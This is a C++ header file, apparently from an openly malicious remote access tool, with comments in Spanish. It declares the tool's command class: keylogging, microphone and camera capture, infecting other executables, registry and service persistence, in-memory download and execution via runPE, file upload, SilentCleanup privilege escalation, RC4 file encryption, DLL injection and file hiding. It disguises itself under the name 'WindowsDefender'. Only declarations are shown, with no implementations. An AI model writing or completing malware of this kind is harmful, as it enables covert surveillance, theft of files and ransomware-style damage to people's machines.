#pragma once
#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <fstream>
#include <iostream>
#include <algorithm>
#include "Keylogger_header.h"
#include "infectPE_header.h"
#include "runPE_header.h"
#include "Infinite_loop_header.h"
#include "audio_header.h"

#define CORRECT "Executed\n"
#define INCORRECT "Didn't work\n"
#define UNKNOWN "Command unknown\n"
#define RUNNING "Running\n"
#define NOT_RUNNING "Not Running\n"
#define PARAMETER "Need a parameter\n"
#define NOTHING ""
#define NEED_SHELLCODE "Need to download a shellcode\n"
#define NEED_EXECUTABLE "Need to download a exec\n"
#define NO_PATH_DIRECT_ACCS "No path found in direct access"
#define KEY_NEEDED "Need to set a key (length 8 min)\n"


#define FAKE_NAME "WindowsDefender"
#define FAKE_CMD "notepad"
#define DOWNLOAD_FILE "wtemp"

#define BUFSIZE 512 
#define SLEEP_TIME 500
#define CMD "cmd "
#define CMD_LENGTH 4

class COMMANDS {
	DWORD _length_command, _keyThreadID, _audioThreadID;
	BOOL _is_downloading = FALSE, _is_downloading_disk = FALSE, _is_uploading = FALSE, _running_keylogger = FALSE, _recording_audio = FALSE;
	LPVOID _pAlloc_file = NULL, _pAlloc_fileIni = NULL;
	int _file_size_down, _last_file_size_down, _file_size_up;
	char* _cipher_key = NULL;

public:
	char* exec(LPVOID command_bfr);
	void set_length_cmd(DWORD length);
	void set_is_downloading(BOOL boolean);
	void set_is_uploading(BOOL boolean);
	int get_file_size_up();
	BOOL get_is_uploading();
	char* get_cipherKey();
	char* set_cipherKey(char* cipher_key);

private:
	char* keylogger_start(char * location); //Usa un Keylogger
	char* keylogger_alive();
	char* keylogger_stop();
	char* audio_start(char * location); //Graba audio del microfono
	char* audio_alive();
	char* audio_stop();
	char* infect_file(char * location, BOOL use_shell_detected); //Infecta otros ejecutables
	char* infect_folder(char* location, BOOL use_shell_detected);
	char* infect_link(char* location, BOOL use_shell_detected);
	char* persis_runRegistry(char* val_name); //Persistencia
	char* persis_runW64Registry(char* val_name);
	char* persis_anyRegistryLM(char* subkey);
	char* persis_service(char* serv_name);
	char* persis_path_system32(char* cmd_name);
	char* download_to_memory(char* buffer_file); //Descarga un archivo en memoria
	char* download_to_disk(); //Descarga un archivo en el disco
	void free_virtual_alloc();
	void save_data(LPVOID data);
	char* upload(char* file_name); //Nos pasa un archivo
	char* runPE_memory(char* fake_program); //Usa runPE para cargar otros archivos
	char* execute_file_other_process(char* location); //Ejecuta un archivo
	char* download_file(char* url);
	char* escalation_SilentCleanup(char* port);
	char* cypher_file_byteInversion(char* location);
	char* cypher_files_in_folder_byteInversion(char* location);
	char* cypher_file_byteCycle(char* location);
	char* cypher_files_in_folder_byteCycle(char* location);
	char* cypher_file_rc4(char* location);
	char* cypher_files_in_folder_rc4(char* location);
	char* change_wallpaper(char* url);
	char* hide_ppal_icons();
	char* hide_file(char* location);
	char* hide_files_in_folder(char* location);
	char* go_X_years_to_the_future(char* years);
	char* go_X_years_to_the_past(char* years);
	char* share_HD_smb();
	char* infiniteLoop_pi_dec();
	char* dllInjection_5(); //DllIjection
	char* spy_6(); //Captura teclado y c�mara
};

#endif // !COMMANDS_H

